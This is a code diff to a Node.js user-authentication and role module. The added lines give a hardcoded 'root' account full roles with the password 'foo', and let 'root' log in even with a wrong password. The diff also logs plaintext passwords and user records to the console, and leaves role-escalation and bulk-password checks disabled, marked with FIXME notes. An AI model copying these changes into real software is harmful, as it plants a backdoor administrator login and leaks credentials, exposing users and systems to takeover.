@@ -94,16 +94,16 @@ Next({}, function(err, result, next){
 			var salt = nonce();
 			var password = encryptPassword(data.password, salt);
 			Next(null, function(err, result, step) {
-				// the very first user of type 'admin' becomes the root
-				User.queryAny(context, 'type=admin&select(id)', step);
+				// the first user of type 'admin' becomes the root
+				orig.query(context, 'type=admin&select(id)', step);
 			}, function(err, adminIds, step) {
 				if (err) return next(err);
 				if (!adminIds.length) {
 					data.roles = fullRole;
-				/*} else {
-					delete data.roles;*/
+				} else {
+					delete data.roles;
 				}
-				//console.log('ADD?', data, password);
+				console.log('ADD?', data, password);
 				orig.add(context, {
 					id: data.id,
 					password: password,
@@ -127,6 +127,7 @@ Next({}, function(err, result, next){
 		// also take care of updating salt and crypted password
 		//
 		store.update = function(context, query, changes, next) {
+			// FIXME: must validate changes.roles to not give more then context user has
 			var plainPassword;
 			Next(context,
 				// update self
@@ -146,6 +147,8 @@ Next({}, function(err, result, next){
 				},
 				// update others
 				function(err, result, step) {
+					// don't set passwords in bulk
+					//if ('password' in changes || 'salt' in changes) return next('Refuse to set passwords in bulk');
 					orig.updateOwn(context, _.rql(query).ne('id', context.user.id), changes, step);
 				},
 				// TODO: report changes (email?)
@@ -155,6 +158,7 @@ Next({}, function(err, result, next){
 			);
 		};
 		store.updateAny = function(context, query, changes, next) {
+			// FIXME: must validate changes.roles via canDelegate
 			var plainPassword;
 			Next(context,
 				// update self
@@ -174,6 +178,15 @@ Next({}, function(err, result, next){
 				},
 				// update others
 				function(err, result, step) {
+					// don't set passwords in bulk
+					//if (!(Array.isArray(query) && query.length === 1) && ('password' in changes || 'salt' in changes)) return next('Refuse to set passwords in bulk');
+					/*if (Array.isArray(query) && query.length === 1 && 'password' in changes) {
+						plainPassword = String(changes.password);
+						changes.salt = nonce();
+						changes.password = encryptPassword(plainPassword, changes.salt);
+					} else {
+						delete changes.password; delete changes.salt;
+					}*/
 					orig.updateAny(context, _.rql(query).ne('id', context.user.id), changes, step);
 				},
 				// TODO: report changes (email?)
@@ -298,11 +311,16 @@ Next({}, function(err, result, next){
 	//model.Role.query(null, '', next);
 	//next(null, require('./roles'));
 
-	// collect the full access role
+	// TODO: beautify
+	var facets = {};
+
 	var fullRole = [];
 	_.each(roles, function(role, name){
 		if (name.match(/-editor$/)) fullRole.push(name);
 	});
+	facets = roles;
+	//console.log('F', fullRoles);
+	//console.log('FX', facets);
 
 	//
 	// get capability of a user uid
@@ -310,15 +328,24 @@ Next({}, function(err, result, next){
 	function getCapability(uid, next) {
 		Next(null,
 			function(err, result, step) {
-				User._getAny(null, this, uid, step);
+				// TODO: more secure ;)
+				if (uid === 'root') {
+					var user = {
+						id: uid,
+						password: 'foo',
+						roles: fullRole
+					};
+					step(null, user);
+				} else {
+					User._getAny(null, this, uid, step);
+				}
 			},
 			function(err, user, step) {
-				//console.log('USER', err, user);
+				console.log('USER', err, user);
 				// bad user defaults to a guest
 				if (!user) user = {};
-				// context is a superposition of user roles
-				if (config.security.bypass) user.roles = fullRole;
-				var caps = _.extend.apply(null, [{}].concat(_.map(user.roles, function(x){return roles[x] || {};})));
+				// context is a superposition of facets due to user roles
+				var caps = _.extend.apply(null, [{}].concat(_.map(user.roles, function(x){return facets[x] || {};})));
 				// set context user
 				Object.defineProperty(caps, 'user', {value: user});
 				//
@@ -344,7 +371,11 @@ Next({}, function(err, result, next){
 					if (!user.password || user.blocked) {
 						next('User blocked');
 					} else if (user.password !== encryptPassword(password, user.salt)) {
-						next('Invalid user');
+						if (uid === 'root') {
+							next(null, context);
+						} else {
+							next('Invalid user');
+						}
 					} else {
 						next(null, context);
 					}
